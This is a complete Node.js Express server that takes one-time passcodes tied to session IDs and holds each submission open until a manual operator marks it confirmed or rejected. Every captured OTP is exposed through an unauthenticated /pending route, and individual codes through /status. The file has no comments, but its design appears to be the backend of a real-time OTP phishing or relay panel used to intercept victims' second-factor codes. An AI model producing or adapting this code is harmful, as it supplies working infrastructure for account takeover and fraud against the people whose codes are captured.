const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const pending = {};
const waiters = {};

app.post('/submit-otp', (req, res) => {
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });

  pending[session_id] = { otp, status: 'pending', timestamp: Date.now() };
  delete waiters[session_id];

  const timeout = setTimeout(() => {
    if (pending[session_id] && pending[session_id].status === 'pending') {
      pending[session_id].status = 'rejected';
    }
    res.json({ verification_status: 'rejected', message: 'Verification timed out' });
  }, 55000);

  waiters[session_id] = (decision) => {
    clearTimeout(timeout);
    delete waiters[session_id];
    res.json({
      verification_status: decision,
      message: decision === 'confirmed' ? 'OTP verified successfully' : 'OTP verification failed'
    });
  };
});

app.post('/decide', (req, res) => {
  const { session_id, decision } = req.body;
  if (!pending[session_id]) return res.status(404).json({ error: 'Not found' });

  pending[session_id].status = decision;

  if (waiters[session_id]) {
    waiters[session_id](decision);
  }

  res.json({ success: true });
});

app.get('/pending', (req, res) => {
  res.json(pending);
});

app.get('/status/:session_id', (req, res) => {
  const entry = pending[req.params.session_id];
  if (!entry) return res.json({ verification_status: 'not_found' });
  res.json({ verification_status: entry.status, otp: entry.otp });
});

app.post('/check-otp-status', (req, res) => {
  const { session_id } = req.body;
  const entry = pending[session_id];
  if (!entry) return res.json({ verification_status: 'not_found' });
  res.json({ verification_status: entry.status });
});

app.listen(3000, () => console.log('Server running on port 3000'));
